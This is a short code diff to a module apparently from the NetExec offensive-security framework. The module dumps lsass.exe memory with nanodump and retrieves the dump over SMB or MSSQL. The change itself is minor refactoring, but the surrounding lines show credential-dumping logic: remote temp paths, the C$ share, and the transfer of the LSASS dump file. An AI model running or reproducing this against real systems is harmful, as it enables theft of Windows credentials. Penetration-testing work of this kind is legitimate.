@@ -39,7 +39,6 @@ class NXCModule:
         NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
         DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
         """
-        self.context = context
         self.remote_tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
         self.tmp_share = self.remote_tmp_dir.split(":")[1]
@@ -174,7 +173,7 @@ class NXCModule:
                     self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.get_file(self.remote_tmp_dir + nano_log_name, filename)
                     self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
